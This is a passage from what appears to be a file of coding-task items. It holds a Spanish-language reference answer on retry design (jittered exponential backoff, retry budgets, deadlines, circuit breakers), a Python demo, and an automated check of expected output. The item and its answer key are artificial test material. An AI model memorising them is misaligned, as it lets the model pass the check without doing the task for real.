1. **Reintentar solo lo reintentable:** timeouts, conexión rechazada, 502/503/504 y 429 (respetando `Retry-After`); NUNCA 4xx del resto (404 o 400 reintentado es repetir el mismo error). Los POST requieren idempotencia garantizada (la tenéis con claves) para que el reintento no duplique efectos.
2. **Backoff exponencial con full jitter y cap:** espera = `random(0, min(cap, base·2^intento))`. El jitter es obligatorio: sin él, todos los clientes reintentan sincronizados en las mismas décimas (la tormenta vuelve en versión polilínea); el cap evita esperas absurdas dentro de un deadline humano.
3. **Presupuesto de reintento (retry budget):** como máximo ~10% de peticiones extra sobre el total de la ventana (p. ej., contando tokens: cada éxito da 0,1 token, cada reintento consume 1; sin tokens, no se reintenta). Esto garantiza matemáticamente que los reintentos no multiplican la carga global: si el servicio va mal, la presión total se acota.
4. **Deadline y presupuesto por petición:** el cliente (navegador) da 2 s; se presupuesta: intento 1 con timeout 300 ms, reintento 1 con 300 ms, reintento 2 con 400 ms y BREAK si no queda margen — nunca lanzar un intento que no puede terminar dentro del deadline del usuario: prefiero fallar rápido a responder tarde por partida doble.
5. **Circuit breaker mínimo en catálogo:** contador móvil de fallos hacia precios; por encima del umbral, catálogo responde con fallback (precio caché + marca `stale`) durante X segundos sin emitir tráfico, y sondea de vez en cuando para recuperarse. Con el budget de reintentos esto es opcional al principio; lo pongo porque el fallback (precio caché) ya existe y barato.

**Pseudocódigo verificado de las piezas 1-2 (semántica exacta del diseño):**

```python
# backoff_demo.py — backoff exponencial con full jitter y clasificacion de errores
import random

def intentar_con_backoff(operacion, max_intentos=5, base_s=0.2, cap_s=2.0, semilla=7):
    rng = random.Random(semilla)          # semilla fija: demo determinista
    intentos = []
    for n in range(1, max_intentos + 1):
        if not operacion(n):
            intentos.append((n, "exito"))
            return intentos
        if n == max_intentos:
            intentos.append((n, "agotado"))
            break
        bruto = min(cap_s, base_s * 2 ** n)
        pausa = rng.uniform(0, bruto)     # full jitter
        intentos.append((n, "fallo, pausa=%.2fs" % pausa))
    return intentos

estado = {"n": 0}
def operacion_inestable(_n):
    estado["n"] += 1
    return estado["n"] <= 3               # falla las 3 primeras veces

plan = intentar_con_backoff(operacion_inestable)
for n, msg in plan:
    print("intento %d: %s" % (n, msg))

def clasificar(codigo):
    if codigo in (408, 429, 500, 502, 503, 504):
        return "reintentable"
    if 400 <= codigo < 500:
        return "no reintentar (error del cliente)"
    return "reintentable"

for c in (429, 503, 404, 400, 500):
    print("HTTP %d -> %s" % (c, clasificar(c)))

assert plan[-1][1] == "exito" and len(plan) == 4
assert clasificar(404) == "no reintentar (error del cliente)"
pausas = [float(m.split("=")[1].rstrip("s")) for _, m in plan if "pausa=" in m]
assert all(0 <= p <= 2.0 for p in pausas), "full jitter respeta el cap"
print("backoff con jitter y cap verificado; los 4xx nunca se reintentan")
```

**Consecuencias y medición:** catálogo deja de multiplicar carga (budget 10% como techo duro, observable con métricas de reintentos/total), las pausas espacian los reintentos (verificado: 0,13-1,04 s con cap 2 s en la demo) y la caída en cascada del enunciado pierde el mecanismo que la alimentaba. Queda pendiente para la siguiente iteración: presupuesto por petición con deadlines (pieza 4) y el breaker con fallback a precio caché (pieza 5), medidos con la métrica `reintentos_consumidos/peticiones`."""),
        ],
        verify=[
            {"name": "fix_backoff_run", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["intento 4: exito", "HTTP 404 -> no reintentar (error del cliente)",
                                         "backoff con jitter y cap verificado"],
             "timeout_s": 10},
        ],
        tags=["retries", "exponential-backoff", "jitter", "retry-budget", "circuit-breaker"],
        stack=["python"], recovery=False,
    ),
]
